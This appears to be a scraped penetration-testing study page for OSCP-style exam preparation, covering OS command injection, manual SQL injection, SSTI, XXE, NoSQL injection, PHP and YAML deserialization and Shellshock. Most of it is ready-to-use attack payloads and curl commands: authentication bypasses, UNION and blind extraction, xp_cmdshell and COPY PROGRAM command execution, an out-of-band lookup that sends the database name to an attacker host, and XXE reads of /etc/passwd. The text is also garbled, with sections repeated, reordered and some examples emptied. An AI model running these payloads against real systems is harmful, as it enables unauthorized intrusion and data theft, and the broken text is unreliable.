numeric context: ```text 1 1 and 1=1 1 and 1=2 ``` > **evidence:** a database error, stable true/false response difference, or repeatable database-specific delay. an isolated `500`, waf block or generic application error is not enough. ### 2. authentication-bypass candidate in an authorized disposable lab, preserve the application's quoting and comment syntax: ```text ' or 1=1-- - administrator'-- - ``` > **verification:** identify the resulting account/session and perform a separate authorized request. a redirect or welcome string alone can be misleading. ### 3. determine union shape first establish column count: ```text ' order by 1-- - ' order by 2-- - ' order by 3-- - ``` or increment `null` columns until the query succeeds: ```text ' union select null-- - ' union select null,null-- - ' union select null,null,null-- - ``` then find a displayed text-compatible column: ```text ' union select null,'marker_7f31',null-- - ``` > **decisive output:** the marker appears in a response location controlled by the injected row. match the exact column count and data types. ### 4. extract only after fingerprinting the dbms ```text mysql: ' union select null,version(),null-- - postgresql: ' union select null,version(),null-- - mssql: ' union select null,@@version,null-- - ``` use the confirmed dbms's catalog and concatenation syntax rather than cycling unrelated payloads. keep each extraction request reproducible in repeater. ### 5. boolean- or time-blind extraction choose a stable page marker or content length for true/false comparisons: ```text ' and substring((select version()),1,1)='p'-- - ' and substring((select version()),1,1)='x'-- - ``` dbms-specific time proofs: ```text mysql: ' and if(1=1,sleep(5),0)-- - postgresql: '; select case when (1=1) then pg_sleep(5) else pg_sleep(0) end-- mssql: '; if (1=1) waitfor delay '0:0:5'-- ``` > repeat controls. time-based results are invalid if application latency overlaps the chosen delay or the condition cannot be changed independently. ## database control to operating-system effect this is a new transition, not an automatic consequence of sql injection. verify the dbms identity, database role, feature state, filesystem permissions and path or egress assumptions first.
mssql — xp_cmdshell when privilege and policy allow ```sql exec sp_configure 'show advanced options', 1; reconfigure; exec sp_configure 'xp_cmdshell', 1; reconfigure; exec xp_cmdshell 'whoami'; ``` requires sufficient server privilege; enabling it changes server configuration. prefer a direct proof when it is already enabled. verify the windows service identity returned by `whoami`.
postgresql — copy program when role and version allow ```sql drop table if exists cmd_output; create table cmd_output(line text); copy cmd_output from program 'id'; select * from cmd_output; ``` requires a superuser or a role such as `pg_execute_server_program`; the command runs under the database service account.
mysql/mariadb — file write as a separate primitive ```sql select '' into outfile '/confirmed/webroot/check.php'; ``` requires `file` privilege, a permitted `secure_file_priv` destination, a known writable webroot and php execution there. verify the file through http, then verify execution. if it only displays or downloads, only file write is proven.
## out-of-band sql injection boundary out-of-band testing is relevant only when direct content, errors, boolean differences and repeatable time delays cannot produce decisive evidence and the database can initiate a network request. a callback proves server/database-side resolution or connectivity; it does not by itself prove arbitrary query-result extraction. hypothetical mysql/windows unc lookup in an authorized lab: ```sql select load_file(concat('\\\\lhost\\', database())); ``` use a uniquely labelled controlled listener/domain and transmit no sensitive row data during proof. required conditions include a dbms/function that performs the lookup, sufficient database/os permissions, working outbound dns/smb/http as applicable and an observable callback. no callback is inconclusive until query execution and outbound reachability are separated. avoid poisoning/spoofing; the current oscp+ exam guide prohibits spoofing. ## failure-guided decisions - quote causes generic error only -> compare true/false and inspect whether the application, proxy or waf generated it; - `union` always errors -> recheck context, column count, types, parentheses and comment syntax; - blind pages differ randomly -> find a stable marker or repeat timing controls before continuing; - command payload is reflected -> no execution proof; compare command-derived output or side effect; - command executes but callback fails -> keep execution confirmed and diagnose listener, route, payload and egress separately in block 7; - database identity lacks the required role/feature -> retain data access and search extracted configuration/credentials rather than assuming os execution. ## handoffs - extracted password/hash/key/token -> block 5 with source and identity context; - exact vulnerable product/version or stored procedure requirement -> block 6; - verified os command -> block 7 session handling; - file write into web content -> [web file handling](02-web-file-handling.md); - useful application account/role -> remap authenticated behavior in block 3. ## ssti — prove template evaluation, then identify the engine use when controlled text appears inside a server-rendered template, email preview or report. replay the real parameter and session. these are separate probes, not one universal payload: ```bash # jinja/twig-style expression probe curl -ss -g --data-urlencode 'name={{7*7}}' http://target:port/path # a different delimiter family, only when the first is literal or errors suggest it curl -ss -g --data-urlencode 'name=${7*7}' http://target:port/path # jinja-versus-twig clue; interpret alongside source/errors, not in isolation curl -ss -g --data-urlencode "name={{7*'7'}}" http://target:port/path ``` read: changed, repeatable computed output compared with a literal control supports evaluation. `49` alone does not identify the engine. jinja commonly repeats the string; twig commonly treats it numerically. confirm the engine/version and exposed objects before selecting a file-read or command primitive. literal reflection → inspect another template/input boundary; a syntax error alone does not prove an exploitable expression. sources: [upstream 1](https://portswigger.net/web-security/server-side-template-injection). ## xxe — test the xml parser and file-read result use a working xml request and put the entity reference in a field whose parsed value is returned. retain the original wrapper, cookies and endpoint. example body for an xml-compatible endpoint: ```xml ]> &probe; ``` ```bash curl -i -b cookies.txt -h 'content-type: application/xml' \ --data-binary @xxe.xml http://target:port/path ``` read: recognizable file content in the parsed field proves read access; echoing the submitted xml does not. choose a platform-appropriate file; windows can use `file:///c:/windows/win.ini`. dtd rejection or unresolved entities → check the parser's actual configuration, not more traversal depth. if the application builds xml around your input and processes xinclude, a separate condition can exist without control over the document's doctype: ```xml ``` a blind endpoint needs an observable parser/network effect before any exfiltration claim. follow verified config/source reads into credential or application testing. sources: [upstream 1](https://portswigger.net/web-security/xxe). ## nosql operator injection — separate json objects from strings use when a login/search accepts structured json or nested form parameters and evidence suggests a mongodb-style query. start with a normal failed request, then change one value's type. ```bash # a known username with an operator-valued password curl -i -c cookies.txt -h 'content-type: application/json' \ --data '{"username":"user","password":{"$ne":""}}' http://target:port/login # distinct context: a form parser that expands bracketed properties curl -i -c cookies.txt --data-urlencode 'username=user' \ --data-urlencode 'password[$ne]=x' http://target:port/login ``` read: compare against the same operator encoded as a plain string and against a known wrong password. confirm the resulting identity through a protected route. a 200/login page or changed error is not authenticated access. type validation, hashing the supplied password before querying, or removal of `$` operators can rule out this route. broader `$ne` username queries may select an unexpected first account; keep the intended identity explicit. sources: [upstream 1](https://portswigger.net/web-security/nosql-injection). ## php deserialization — match the gadget to installed dependencies use when a controlled serialized value reaches unsafe `unserialize()` and the required classes are loaded. identify dependencies/builds from source or `composer.lock` first. ```bash # inspect available families and the exact chain's version/vector requirements phpggc -l phpggc -i monolog/rce1 # example function-call gadget, only when that chain matches the application phpggc -b monolog/rce1 system id > payload.b64 ``` read: base64 is a transport choice, not a bypass—the sink must decode it before deserialization. preserve raw serialized lengths and binary bytes; use the encoding that the real request expects. a generated payload is not execution proof. missing classes, rejected object types or a different dependency version → choose a matching chain or another primitive. verify a benign effect before selecting a shell payload. sources: [upstream 1](https://github.com/ambionics/phpggc). ## unsafe yaml construction — distinguish loading from safe parsing use when source or errors identify python yaml processing with an unsafe loader and you control the loaded yaml. an ordinary json field or `yaml.safe_load()` does not supply this condition. ```yaml !!python/object/apply:os.system ["id"] ``` put the probe in the actual yaml input/file, preserving its required surrounding structure. read: attributable command output/effect supports unsafe construction. `constructorerror` for the python tag commonly indicates a loader that does not permit that constructor. confirm the installed pyyaml version and loader (`unsafeloader`/unsafe load), rather than assuming that any use of yaml permits python object execution. sources: [upstream 1](https://github.com/yaml/pyyaml). ## sql truncation or normalization mismatch at registration use when the application checks one representation for uniqueness but the db stores or compares a different one—for example, an overlong username in a fixed-length column. validate with a disposable account first. ```sql -- with sql visibility, inspect the real column and strict-mode behavior select @@sql_mode; select column_name, character_maximum_length from information_schema.columns where table_schema = database() and table_name = 'users'; ``` compare registration/login behavior for the test name, its trailing-space form and an overlong form that would truncate to it. a plus character only becomes a space in the appropriate form encoding; it is not a universal sql payload. a strict length error or a unique constraint on the normalized stored value can stop this path. confirm an actual account/authorization change before calling it a bypass. sources: [upstream 1](https://dev.mysql.com/doc/refman/8.4/en/sql-mode.html). ## shellshock candidate — only for a cgi path that invokes vulnerable bash use when a confirmed cgi endpoint passes http-derived environment variables into an affected bash process. an arbitrary php/java route or a bash version string alone does not establish this chain. ```bash # bounded command-effect probe at the actual cgi script curl -i -h 'user-agent: () { :;}; echo; /usr/bin/id' \ http://target:port/cgi-bin/script ``` read: an attributable uid in the executed cgi response supports the effect; reflection of the header text does not. header/cgi parsing errors require inspecting the request and script behavior. no effect → re-check the actual component and patch status before selecting another poc. this is the cve-2014-6271 family, not a generic command separator for every web input. sources: [upstream 1](https://nvd.nist.gov/vuln/detail/cve-2014-6271). ## sources supplied pen-200 ch 9.4 pp274-279 and ch 10 pp285-300; reviewed [getsh web/sqli route](https://lizajose.github.io/getsh/web); [hexdump sql injection module](https://github.com/leonardoe95/oscp/tree/main/modules/web/03-sql-injection); [owasp command injection testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-web_application_security_testing/07-input_validation_testing/12-testing_for_command_injection), [owasp sql injection testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-web_application_security_testing/07-input_validation_testing/05-testing_for_sql_injection); current [oscp+ exam guide](https://help.offsec.com/hc/en-us/articles/360040165632-oscp-exam-guide).

## manual sql injection workflow

> **exam boundary:** the current oscp+ exam guide prohibits sqlmap and other automatic exploitation tools. the following procedure is manual. recheck the current guide before an exam.

### 1. establish query influence

replay a valid request in burp repeater. change one parameter and compare a normal value, quote, true condition and false condition:

```text
value
value'
value' and '1'='1
value' and '1'='2
```

for a numeric context:

```text
1
1 and 1=1
1 and 1=2
```

> **evidence:** a database error, stable true/false response difference, or repeatable database-specific delay. an isolated `500`, waf block or generic application error is not enough.

### 2. authentication-bypass candidate

in an authorized disposable lab, preserve the application's quoting and comment syntax:

```text
' or 1=1-- -
administrator'-- -
```

> **verification:** identify the resulting account/session and perform a separate authorized request. a redirect or welcome string alone can be misleading.

### 3. determine union shape

first establish column count:

```text
' order by 1-- -
' order by 2-- -
' order by 3-- -
```

or increment `null` columns until the query succeeds:

```text
' union select null-- -
' union select null,null-- -
' union select null,null,null-- -
```

then find a displayed text-compatible column:

```text
' union select null,'marker_7f31',null-- -
```

> **decisive output:** the marker appears in a response location controlled by the injected row. match the exact column count and data types.

### 4. extract only after fingerprinting the dbms

```text
mysql:      ' union select null,version(),null-- -
postgresql: ' union select null,version(),null-- -
mssql:      ' union select null,@@version,null-- -
```

use the confirmed dbms's catalog and concatenation syntax rather than cycling unrelated payloads. keep each extraction request reproducible in repeater.

### 5. boolean- or time-blind extraction

choose a stable page marker or content length for true/false comparisons:

```text
' and substring((select version()),1,1)='p'-- -
' and substring((select version()),1,1)='x'-- -
```

dbms-specific time proofs:

```text
mysql:      ' and if(1=1,sleep(5),0)-- -
postgresql: '; select case when (1=1) then pg_sleep(5) else pg_sleep(0) end--
mssql:      '; if (1=1) waitfor delay '0:0:5'--
```

> repeat controls. time-based results are invalid if application latency overlaps the chosen delay or the condition cannot be changed independently.

sections.title: 1. Establish query influence
sections.search:
### 1. establish query influence

replay a valid request in burp repeater. change one parameter and compare a normal value, quote, true condition and false condition:

```text
value
value'
value' and '1'='1
value' and '1'='2
```

for a numeric context:

```text
1
1 and 1=1
1 and 1=2
```

> **evidence:** a database error, stable true/false response difference, or repeatable database-specific delay. an isolated `500`, waf block or generic application error is not enough.

sections.title: 2. Authentication-bypass candidate
sections.search:
### 2. authentication-bypass candidate

in an authorized disposable lab, preserve the application's quoting and comment syntax:

```text
' or 1=1-- -
administrator'-- -
```

> **verification:** identify the resulting account/session and perform a separate authorized request. a redirect or welcome string alone can be misleading.

sections.title: 3. Determine UNION shape
sections.search:
### 3. determine union shape

first establish column count:

```text
' order by 1-- -
' order by 2-- -
' order by 3-- -
```

or increment `null` columns until the query succeeds:

```text
' union select null-- -
' union select null,null-- -
' union select null,null,null-- -
```

then find a displayed text-compatible column:

```text
' union select null,'marker_7f31',null-- -
```

> **decisive output:** the marker appears in a response location controlled by the injected row. match the exact column count and data types.

sections.title: 4. Extract only after fingerprinting the DBMS
sections.search:
### 4. extract only after fingerprinting the dbms

```text
mysql:      ' union select null,version(),null-- -
postgresql: ' union select null,version(),null-- -
mssql:      ' union select null,@@version,null-- -
```

use the confirmed dbms's catalog and concatenation syntax rather than cycling unrelated payloads. keep each extraction request reproducible in repeater.

choose a stable page marker or content length for true/false comparisons:

```text
' and substring((select version()),1,1)='x'-- -
```

dbms-specific time proofs:

```text
mysql:      ' and if(1=1,sleep(5),0)-- -
postgresql: '; select case when (1=1) then pg_sleep(5) else pg_sleep(0) end--
mssql:      '; if (1=1) waitfor delay '0:0:5'--
```

Out-of-band SQL injection boundary
sections.search:
## out-of-band sql injection boundary

out-of-band testing is relevant only when direct content, errors, boolean differences and repeatable time delays cannot produce decisive evidence and the database can initiate a network request. a callback proves server/database-side resolution or connectivity; it does not by itself prove arbitrary query-result extraction.

hypothetical mysql/windows unc lookup in an authorized lab:

```sql
select load_file(concat('\\\\lhost\\', database()));
```

use a uniquely labelled controlled listener/domain and transmit no sensitive row data during proof. required conditions include a dbms/function that performs the lookup, sufficient database/os permissions, working outbound dns/smb/http as applicable and an observable callback. no callback is inconclusive until query execution and outbound reachability are separated. avoid poisoning/spoofing; the current oscp+ exam guide prohibits spoofing.

sections.title: Failure-guided decisions
Handoffs
SSTI — prove template evaluation, then identify the engine
sections.search:
## ssti — prove template evaluation, then identify the engine

use when controlled text appears inside a server-rendered template, email preview or report. replay the real parameter and session. these are separate probes, not one universal payload:

```bash
# jinja/twig-style expression probe
curl -ss -g --data-urlencode 'name={{7*7}}' http://target:port/path

# a different delimiter family, only when the first is literal or errors suggest it
curl -ss -g --data-urlencode 'name=${7*7}' http://target:port/path

# jinja-versus-twig clue; interpret alongside source/errors, not in isolation
curl -ss -g --data-urlencode "name={{7*'7'}}" http://target:port/path
```

read: changed, repeatable computed output compared with a literal control supports evaluation. `49` alone does not identify the engine. jinja commonly repeats the string; twig commonly treats it numerically. confirm the engine/version and exposed objects before selecting a file-read or command primitive. literal reflection → inspect another template/input boundary; a syntax error alone does not prove an exploitable expression.

sources: [upstream 1](https://portswigger.net/web-security/server-side-template-injection).

sections.title: XXE — test the XML parser and file-read result
sections.search:
## xxe — test the xml parser and file-read result

use a working xml request and put the entity reference in a field whose parsed value is returned. retain the original wrapper, cookies and endpoint. example body for an xml-compatible endpoint:

```xml
<?xml version="1.0"?>
<!doctype request [<!entity probe system "file:///etc/passwd">]>
<request><value>&probe;</value></request>
```

```bash
curl -i -b cookies.txt -h 'content-type: application/xml' \
  --data-binary @xxe.xml http://target:port/path
```

read: recognizable file content in the parsed field proves read access; echoing the submitted xml does not. choose a platform-appropriate file; windows can use `file:///c:/windows/win.ini`. dtd rejection or unresolved entities → check the parser's actual configuration, not more traversal depth.

if the application builds xml around your input and processes xinclude, a separate condition can exist without control over the document's doctype:

```xml
<value xmlns:xi="http://www.w3.org/2001/xinclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</value>
```

a blind endpoint needs an observable parser/network effect before any exfiltration claim. follow verified config/source reads into credential or application testing.

sources: [upstream 1](https://portswigger.net/web-security/xxe).

sections.title: NoSQL operator injection — separate JSON objects from strings
sections.search:
## nosql operator injection — separate json objects from strings

use when a login/search accepts structured json or nested form parameters and evidence suggests a mongodb-style query. start with a normal failed request, then change one value's type.

```bash
# a known username with an operator-valued password
curl -i -c cookies.txt -h 'content-type: application/json' \
  --data '{"username":"user","password":{"$ne":""}}' http://target:port/login

# distinct context: a form parser that expands bracketed properties
curl -i -c cookies.txt --data-urlencode 'username=user' \
  --data-urlencode 'password[$ne]=x' http://target:port/login
```

read: compare against the same operator encoded as a plain string and against a known wrong password. confirm the resulting identity through a protected route. a 200/login page or changed error is not authenticated access. type validation, hashing the supplied password before querying, or removal of `$` operators can rule out this route. broader `$ne` username queries may select an unexpected first account; keep the intended identity explicit.

sources: [upstream 1](https://portswigger.net/web-security/nosql-injection).

sections.title: PHP deserialization — match the gadget to installed dependencies
sections.search:
## php deserialization — match the gadget to installed dependencies

use when a controlled serialized value reaches unsafe `unserialize()` and the required classes are loaded. identify dependencies/builds from source or `composer.lock` first.

```bash
# inspect available families and the exact chain's version/vector requirements
phpggc -l
phpggc -i monolog/rce1

# example function-call gadget, only when that chain matches the application
phpggc -b monolog/rce1 system id > payload.b64
```

read: base64 is a transport choice, not a bypass—the sink must decode it before deserialization. preserve raw serialized lengths and binary bytes; use the encoding that the real request expects. a generated payload is not execution proof. missing classes, rejected object types or a different dependency version → choose a matching chain or another primitive. verify a benign effect before selecting a shell payload.

sources: [upstream 1](https://github.com/ambionics/phpggc).

sections.title: Unsafe YAML construction — distinguish loading from safe parsing
sections.search:
## unsafe yaml construction — distinguish loading from safe parsing

use when source or errors identify python yaml processing with an unsafe loader and you control the loaded yaml. an ordinary json field or `yaml.safe_load()` does not supply this condition.

```yaml
!!python/object/apply:os.system ["id"]
```

put the probe in the actual yaml input/file, preserving its required surrounding structure. read: attributable command output/effect supports unsafe construction. `constructorerror` for the python tag commonly indicates a loader that does not permit that constructor. confirm the installed pyyaml version and loader (`unsafeloader`/unsafe load), rather than assuming that any use of yaml permits python object execution.

sources: [upstream 1](https://github.com/yaml/pyyaml).

sections.title: SQL truncation or normalization mismatch at registration
sections.search:
## sql truncation or normalization mismatch at registration

use when the application checks one representation for uniqueness but the db stores or compares a different one—for example, an overlong username in a fixed-length column. validate with a disposable account first.

```sql
-- with sql visibility, inspect the real column and strict-mode behavior
select @@sql_mode;
select column_name, character_maximum_length
from information_schema.columns
where table_schema = database() and table_name = 'users';
```

compare registration/login behavior for the test name, its trailing-space form and an overlong form that would truncate to it. a plus character only becomes a space in the appropriate form encoding; it is not a universal sql payload. a strict length error or a unique constraint on the normalized stored value can stop this path. confirm an actual account/authorization change before calling it a bypass.

sources: [upstream 1](https://dev.mysql.com/doc/refman/8.4/en/sql-mode.html).

sections.title: Shellshock candidate — only for a CGI path that invokes vulnerable Bash
sections.search:
## shellshock candidate — only for a cgi path that invokes vulnerable bash

use when a confirmed cgi endpoint passes http-derived environment variables into an affected bash process. an arbitrary php/java route or a bash version string alone does not establish this chain.

```bash
# bounded command-effect probe at the actual cgi script
curl -i -h 'user-agent: () { :;}; echo; /usr/bin/id' \
  http://target:port/cgi-bin/script
```

read: an attributable uid in the executed cgi response supports the effect; reflection of the header text does not. header/cgi parsing errors require inspecting the request and script behavior. no effect → re-check the actual component and patch status before selecting another poc. this is the cve-2014-6271 family, not a generic command separator for every web input.

sources: [upstream 1](https://nvd.nist.gov/vuln/detail/cve-2014-6271).

# Command and Manual SQL Injection [← Stage index](README.md) · [Web mapping](../02-service-enumeration/10-http-web-mapping.md) · [Quick sheet](../../cheatsheets/web-exploitation.md#command-injection) · [Mechanics](../../notes/Master_Notes.md#injection-primitives) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Turn application weaknesses into access](../../notes/methods/web-exploitation.md) > **Use when:** mapped application behavior suggests attacker input reaches an operating-system command or database query. Preserve a valid baseline, change one input at a time and prove each capability separately. ## Operating-system command injection ### Visible-output baseline Start with a benign identity marker appropriate to the inferred operating system: ```bash curl -skG --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH curl -skG --data-urlencode 'host=127.0.0.1&whoami' http://TARGET:PORT/PATH ``` > **Decisive output:** command output attributable to the target, such as a username/UID that is absent from the normal response. Reflection of the payload is not execution.
Variants — separators, quoting and POST bodies Test only the forms compatible with the observed command and platform: ```text 127.0.0.1; id 127.0.0.1 && id 127.0.0.1 | id 127.0.0.1%0aid ``` ```bash curl -sk -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH curl -sk -X POST -H 'Content-Type: application/json' -d '{"host":"127.0.0.1;id"}' http://TARGET:PORT/api/PATH ``` For Windows command contexts, use an observed `cmd.exe` or PowerShell boundary before choosing syntax: ```text 127.0.0.1 & whoami 127.0.0.1 | whoami ```
### Blind timing proof Repeat a control and a bounded-delay request several times: ```bash curl -sk -o /dev/null -w 'control=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1' http://TARGET:PORT/PATH curl -sk -o /dev/null -w 'test=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1;sleep 5' http://TARGET:PORT/PATH ``` Windows candidate after platform evidence: ```text 127.0.0.1 & timeout /t 5 ``` > **Decisive output:** a repeatable delay near the chosen interval relative to multiple controls. One slow response is inconclusive. ### After command execution ```text Linux: id; hostname; pwd Windows: whoami; hostname; cd ``` Record the execution identity, working directory, shell/parser and egress assumptions. Hand reliable-session work to Block 7; do not treat one command response as an interactive shell. ## Manual SQL injection workflow > **Exam boundary:** the current OSCP+ exam guide prohibits SQLmap and other automatic exploitation tools. The following procedure is manual. Recheck the current guide before an exam. ### 1. Establish query influence Replay a valid request in Burp Repeater. Change one parameter and compare a normal value, quote, true condition and false condition: ```text VALUE VALUE' VALUE' AND '1'='1 VALUE' AND '1'='2 ``` For a numeric context: ```text 1 1 AND 1=1 1 AND 1=2 ``` > **Evidence:** a database error, stable true/false response difference, or repeatable database-specific delay. An isolated `500`, WAF block or generic application error is not enough. ### 2. Authentication-bypass candidate In an authorized disposable lab, preserve the application's quoting and comment syntax: ```text ' OR 1=1-- - administrator'-- - ``` > **Verification:** identify the resulting account/session and perform a separate authorized request. A redirect or welcome string alone can be misleading. ### 3. Determine UNION shape First establish column count: ```text ' ORDER BY 1-- - ' ORDER BY 2-- - ' ORDER BY 3-- - ``` Or increment `NULL` columns until the query succeeds: ```text ' UNION SELECT NULL-- - ' UNION SELECT NULL,NULL-- - ' UNION SELECT NULL,NULL,NULL-- - ``` Then find a displayed text-compatible column: ```text ' UNION SELECT NULL,'MARKER_7F31',NULL-- - ``` > **Decisive output:** the marker appears in a response location controlled by the injected row. Match the exact column count and data types. ### 4. Extract only after fingerprinting the DBMS ```text MySQL: ' UNION SELECT NULL,version(),NULL-- - PostgreSQL: ' UNION SELECT NULL,version(),NULL-- - MSSQL: ' UNION SELECT NULL,@@version,NULL-- - ``` Use the confirmed DBMS's catalog and concatenation syntax rather than cycling unrelated payloads. Keep each extraction request reproducible in Repeater. ### 5. Boolean- or time-blind extraction Choose a stable page marker or content length for true/false comparisons: ```text ' AND SUBSTRING((SELECT version()),1,1)='P'-- - ' AND SUBSTRING((SELECT version()),1,1)='X'-- - ``` DBMS-specific time proofs: ```text MySQL: ' AND IF(1=1,SLEEP(5),0)-- - PostgreSQL: '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- MSSQL: '; IF (1=1) WAITFOR DELAY '0:0:5'-- ``` > Repeat controls. Time-based results are invalid if application latency overlaps the chosen delay or the condition cannot be changed independently. ## Database control to operating-system effect This is a new transition, not an automatic consequence of SQL injection. Verify the DBMS identity, database role, feature state, filesystem permissions and path or egress assumptions first.
MSSQL — xp_cmdshell when privilege and policy allow ```sql EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'; ``` Requires sufficient server privilege; enabling it changes server configuration. Prefer a direct proof when it is already enabled. Verify the Windows service identity returned by `whoami`.
PostgreSQL — COPY PROGRAM when role and version allow ```sql DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(line text); COPY cmd_output FROM PROGRAM 'id'; SELECT * FROM cmd_output; ``` Requires a superuser or a role such as `pg_execute_server_program`; the command runs under the database service account.
MySQL/MariaDB — file write as a separate primitive ```sql SELECT '' INTO OUTFILE '/CONFIRMED/WEBROOT/check.php'; ``` Requires `FILE` privilege, a permitted `secure_file_priv` destination, a known writable webroot and PHP execution there. Verify the file through HTTP, then verify execution. If it only displays or downloads, only file write is proven.
## Out-of-band SQL injection boundary Out-of-band testing is relevant only when direct content, errors, boolean differences and repeatable time delays cannot produce decisive evidence and the database can initiate a network request. A callback proves server/database-side resolution or connectivity; it does not by itself prove arbitrary query-result extraction. Hypothetical MySQL/Windows UNC lookup in an authorized lab: ```sql SELECT LOAD_FILE(CONCAT('\\\\LHOST\\', DATABASE())); ``` Use a uniquely labelled controlled listener/domain and transmit no sensitive row data during proof. Required conditions include a DBMS/function that performs the lookup, sufficient database/OS permissions, working outbound DNS/SMB/HTTP as applicable and an observable callback. No callback is inconclusive until query execution and outbound reachability are separated. Avoid poisoning/spoofing; the current OSCP+ exam guide prohibits spoofing. ## Failure-guided decisions - quote causes generic error only -> compare true/false and inspect whether the application, proxy or WAF generated it; - `UNION` always errors -> recheck context, column count, types, parentheses and comment syntax; - blind pages differ randomly -> find a stable marker or repeat timing controls before continuing; - command payload is reflected -> no execution proof; compare command-derived output or side effect; - command executes but callback fails -> keep execution confirmed and diagnose listener, route, payload and egress separately in Block 7; - database identity lacks the required role/feature -> retain data access and search extracted configuration/credentials rather than assuming OS execution. ## Handoffs - extracted password/hash/key/token -> Block 5 with source and identity context; - exact vulnerable product/version or stored procedure requirement -> Block 6; - verified OS command -> Block 7 session handling; - file write into web content -> [web file handling](02-web-file-handling.md); - useful application account/role -> remap authenticated behavior in Block 3. ## SSTI — prove template evaluation, then identify the engine Use when controlled text appears inside a server-rendered template, email preview or report. Replay the real parameter and session. These are separate probes, not one universal payload: ```bash # Jinja/Twig-style expression probe curl -sS -G --data-urlencode 'name={{7*7}}' http://TARGET:PORT/PATH # A different delimiter family, only when the first is literal or errors suggest it curl -sS -G --data-urlencode 'name=${7*7}' http://TARGET:PORT/PATH # Jinja-versus-Twig clue; interpret alongside source/errors, not in isolation curl -sS -G --data-urlencode "name={{7*'7'}}" http://TARGET:PORT/PATH ``` Read: changed, repeatable computed output compared with a literal control supports evaluation. `49` alone does not identify the engine. Jinja commonly repeats the string; Twig commonly treats it numerically. Confirm the engine/version and exposed objects before selecting a file-read or command primitive. Literal reflection → inspect another template/input boundary; a syntax error alone does not prove an exploitable expression. Sources: [upstream 1](https://portswigger.net/web-security/server-side-template-injection). ## XXE — test the XML parser and file-read result Use a working XML request and put the entity reference in a field whose parsed value is returned. Retain the original wrapper, cookies and endpoint. Example body for an XML-compatible endpoint: ```xml ]> &probe; ``` ```bash curl -i -b cookies.txt -H 'Content-Type: application/xml' \ --data-binary @xxe.xml http://TARGET:PORT/PATH ``` Read: recognizable file content in the parsed field proves read access; echoing the submitted XML does not. Choose a platform-appropriate file; Windows can use `file:///C:/Windows/win.ini`. DTD rejection or unresolved entities → check the parser's actual configuration, not more traversal depth. If the application builds XML around your input and processes XInclude, a separate condition can exist without control over the document's DOCTYPE: ```xml ``` A blind endpoint needs an observable parser/network effect before any exfiltration claim. Follow verified config/source reads into credential or application testing. Sources: [upstream 1](https://portswigger.net/web-security/xxe). ## NoSQL operator injection — separate JSON objects from strings Use when a login/search accepts structured JSON or nested form parameters and evidence suggests a MongoDB-style query. Start with a normal failed request, then change one value's type. ```bash # A known username with an operator-valued password curl -i -c cookies.txt -H 'Content-Type: application/json' \ --data '{"username":"USER","password":{"$ne":""}}' http://TARGET:PORT/LOGIN # Distinct context: a form parser that expands bracketed properties curl -i -c cookies.txt --data-urlencode 'username=USER' \ --data-urlencode 'password[$ne]=x' http://TARGET:PORT/LOGIN ``` Read: compare against the same operator encoded as a plain string and against a known wrong password. Confirm the resulting identity through a protected route. A 200/login page or changed error is not authenticated access. Type validation, hashing the supplied password before querying, or removal of `$` operators can rule out this route. Broader `$ne` username queries may select an unexpected first account; keep the intended identity explicit. Sources: [upstream 1](https://portswigger.net/web-security/nosql-injection). ## PHP deserialization — match the gadget to installed dependencies Use when a controlled serialized value reaches unsafe `unserialize()` and the required classes are loaded. Identify dependencies/builds from source or `composer.lock` first. ```bash # Inspect available families and the exact chain's version/vector requirements phpggc -l phpggc -i Monolog/RCE1 # Example function-call gadget, only when that chain matches the application phpggc -b Monolog/RCE1 system id > payload.b64 ``` Read: base64 is a transport choice, not a bypass—the sink must decode it before deserialization. Preserve raw serialized lengths and binary bytes; use the encoding that the real request expects. A generated payload is not execution proof. Missing classes, rejected object types or a different dependency version → choose a matching chain or another primitive. Verify a benign effect before selecting a shell payload. Sources: [upstream 1](https://github.com/ambionics/phpggc). ## Unsafe YAML construction — distinguish loading from safe parsing Use when source or errors identify Python YAML processing with an unsafe loader and you control the loaded YAML. An ordinary JSON field or `yaml.safe_load()` does not supply this condition. ```yaml !!python/object/apply:os.system ["id"] ``` Put the probe in the actual YAML input/file, preserving its required surrounding structure. Validate with a disposable account first. ```sql -- With SQL visibility, inspect the real column and strict-mode behavior SELECT @@sql_mode; SELECT COLUMN_NAME, CHARACTER_MAXIMUM_LENGTH FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = 'users'; ``` Compare registration/login behavior for the test name, its trailing-space form and an overlong form that would truncate to it.
